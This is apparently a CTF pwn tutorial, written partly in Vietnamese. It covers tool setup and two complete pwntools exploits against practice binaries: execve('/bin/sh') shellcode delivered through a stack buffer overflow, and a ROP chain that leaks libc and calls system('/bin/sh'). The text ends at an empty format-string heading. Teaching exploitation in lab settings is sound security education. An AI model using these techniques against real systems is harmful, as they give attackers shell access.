# Đôi điều về Pwnable/Pwn

## 1. Lịch sử Pwn

​	Theo user Tactical Ghost trên Urban Dictionary: "pwn (v.) /pəʊn/ có nghĩa là át chế đối phương (trong game, v.v.)". Nguồn gốc của từ Pwn được cho là ở thời mà người người chơi WarCraft, nhà nhà chơi WarCraft, khi mà một người thiết kế map đã nhầm "Own" thành "Pwn" do "O" sát với "P" trên bàn phím QWERTY. Một thông báo đáng lẽ là "player has been owned" đã bị lỗi thành "player has been pwned".

## 2. Pwnable/Pwn trong CTF và ứng dụng thực tế

​	Mục đích thông thường của pwn: Binary exploitation -> Privilege escalation

​	Trong CTF, pwn đa phần chỉ tập trung vào binary exploitation, get shell máy victim, tìm kiếm flag và submit. Môi trường mà người chơi phải tiến hành pwn thường sẽ là linux. 

​	Tập lệnh trong binary hầu hết là intel x86, x86-64, một vài trường hợp có thể binary sử dụng arm instructions. 

​	Ứng dụng của pwn trong thực tế:

- Khai thác lỗi kernel: các máy chủ sử dụng nhân linux,...

- Khai thác lỗi phần mềm: sudo, afpd,... 

## 3. Kiến thức nền

- Khả năng đọc hiểu code C (các hàm thông dụng - gets, printf, scanf, read, write, mmap, calloc, malloc, cấu trúc dữ liệu - đặc biệt là con trỏ)
- Khả năng đọc hiểu assembly (i386, x86-64, arm64, mips64el,...)
- Khả năng code python và sử dụng các thư viện hỗ trợ (pwntools)
- Khả năng debug dùng các công cụ debugger như gdb (plugin pwndbg, gef, peda), windbg, x64dbg,..., kết hợp đọc code sử dụng công cụ disasembler: ida, ghidra, binary ninja,... 
- Kiến thức về dịch ngược, các lỗ hổng cơ bản và cách khai thác.

## 4. Setup hệ thống

- Ubuntu WSL2 | Máy ảo Ubuntu | Máy vật lý Ubuntu (Các máy chủ challenge run app thường sẽ chạy hđh Ubuntu)

- Python 3

- Thư viện pwntools

  `sudo apt-get update`
  `sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential`
  `sudo python3 -m pip install --upgrade pip`
  `sudo python3 -m pip install --upgrade pwntools`

- pwninit

  `sudo apt-get openssl liblzma-dev pkg-config`
  `git clone https://github.com/io12/pwninit`
  `cd pwninit`
  `cargo install pwninit`

- one_gadget

- Một số dependency cho foreign architecture

```
# i386
sudo apt install libc6-i386
# qemu-user
sudo apt install qemu-user
sudo mkdir /etc/qemu-binfmt
# ARMv5
sudo apt install libc6-armel-cross
sudo ln -s /usr/arm-linux-gnueabi /etc/qemu-binfmt/arm
# MIPS
sudo apt install libc6-mipsel-cross
sudo ln -s /usr/mipsel-linux-gnu /etc/qemu-binfmt/mipsel
```

- Plugin pwndbg

## 5. Một số dạng thường gặp

### Shellcode

![alt text](/images/image-8.png)

#### Use Ghidra to Decompile:

![alt text](/images/image-7.png)
![alt text](/images/image-6.png)

In `run()`, enter 80-byte `local_58` (no error because `local_58` is initialized to 80 bytes), then enter 544-byte `local_218` (there is a buffer overflow error because `local_218` is only initialized to 524 bytes).

![alt text](/images/image.png)

`checksec` we see that `NX` is turned off => Stack can be executed => Shellcode when put on Stack will be executed.

When debugging, enter `local_218` of 544 bytes:

![alt text](/images/image-1.png)

See that at `ret` the address has been overwritten by `local_218` => has control over the program.

To execute Shellcode, we need to let the program return a pointer to that Shellcode. `RAX` is pointing to the `local_58`, we use `RAX` to point to the Shellcode. Then `ret` to a gadget to call that Shellcode.

Using gadget `call rax;`

![alt text](/images/image-3.png)

Using Shellcode of the function `execve('/bin/sh', 0, 0)` to get the shell of the program.

![alt text](/images/image-2.png)

Next, we need to find the offset to ret to overwrite with the address of `call rax;`

![alt text](/images/image-4.png)

Using ```cyclic -l``` finds an offset of 536.

#### Exploit
```
#!/usr/bin/ python3

from pwn import*

context.binary = exe = ELF('./bof5', checksec=False)
p = process(exe.path)

offset = 536

shellcode = asm(
    '''
    mov rax, 0x3b                   # rax = 0x3b
    mov rdi, 29400045130965551      # 29400045130965551 = '/bin/sh'
    push rdi                        
    mov rdi, rsp                    # rdi trỏ tới chuỗi '/bin/sh'
    xor rsi, rsi                    # rsi = 0
    xor rdx, rdx                    # rdx = 0

    syscall                         
    ''', arch='amd64')              

call_rax = 0x0000000000401014

p.sendafter(b'> ', shellcode)

p.sendafter(b'> ', b'A' * offset + p64(call_rax))

p.interactive()
```

![alt text](/images/image-5.png)

---
### Return Oriented Programming (ROP)

![alt text](/images/image-1-2.png)

Use Ghidra to Decompile:

![alt text](/images/image-2-0.png)

Here there is a buffer overflow error in the `read` function when `local_58` is initialized to 80 but `read` allows input up to 120.

![alt text](/images/image-2-2.png)

We see here that there is no function that can create a shell, so we have to find a way to leak `libc's address`. Because when we get the address of libc, we can find the address of the `system` function and execute the function `system('/bin/sh')` to create a shell.

![alt text](/images/image-3-2.png)

We see that the address of binary is static and that of libc is dynamic. So we have to find a way to leak `libc's base address`.

![alt text](/images/image-4-2.png)

Because there is `no canary`, buffer overflow can be used to `return to libc`.

![alt text](/images/image-5-2.png)

First, we find the offset of `88`.

There are 2 concepts here:
```
GOT: contains the addresses of libc functions. (0x403fd8)
PLT: executes the function contained in GOT. (0x7ffff7e23bd0)
```

![alt text](/images/image-6-2.png)

Next, in `puts("Say something: ")`, we see that only one parameter is needed to print the data of that parameter. So if we put the address `puts@got` into RDI (first parameter) and then execute `puts@plt`, we will leak the address of libc.

We use `ropper` to find a gadget to control RDI:

![alt text](/images/image-7-2.png)

And that is `0x0000000000401263: pop rdi; ret;`

```
offset = 88
pop_rdi = 0x0000000000401263

payload  = b'A' * offset + p64(pop_rdi) + p64(exe.got.puts) + p64(exe.plt.puts)
payload += p64(exe.sym.main)
sla(b'\n', payload)
```

![alt text](/images/image-9-2.png)

So we leak 6 address bytes. We see that at the end of the payload there is `exe.sym.main` so that after the leak is complete, the program will run again without ending. Next, we use the 6 leaked bytes to find the libc base address.

![alt text](/images/image-8-2.png)
![alt text](/images/image-10-2.png)

```
libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
log.info("Leak libc: " + hex(libc_leak))
libc.address = libc_leak - 0x87bd0
log.info("Libc base: " + hex(libc.address))
```

To find the libc base, we use the leaked address subtract the base address while debugging to find the offset of `0x87bd0`. So we get libc base:

![alt text](/images/image-11-2.png)

When we get the libc base, we get the address of the `system` function and the string `'/bin/sh'` in libc. Final step, get shell:
```
payload  = b'A' * offset + p64(pop_rdi)
payload += p64( next(libc.search('/bin/sh'))) + p64(libc.sym.system)
sl(payload)
```
We have a complete exploit:
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('bof7', checksec=False)
libc = exe.libc
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
# GDB()

### LEAK LIBC ###
offset = 88
pop_rdi = 0x0000000000401263

payload  = b'A' * offset + p64(pop_rdi) + p64(exe.got.puts) + p64(exe.plt.puts)
payload += p64(exe.sym.main)
sla(b'\n', payload)

libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
log.info("Leak libc: " + hex(libc_leak))
libc.address = libc_leak - libc.sym.puts
log.info("Libc base: " + hex(libc.address))

### GET SHELL ###
payload  = b'A' * offset + p64(pop_rdi)
payload += p64( next(libc.search('/bin/sh'))) + p64(libc.sym.system)
sl(payload)

p.interactive()
```

![alt text](/images/image-12-2.png)
---

### Format String
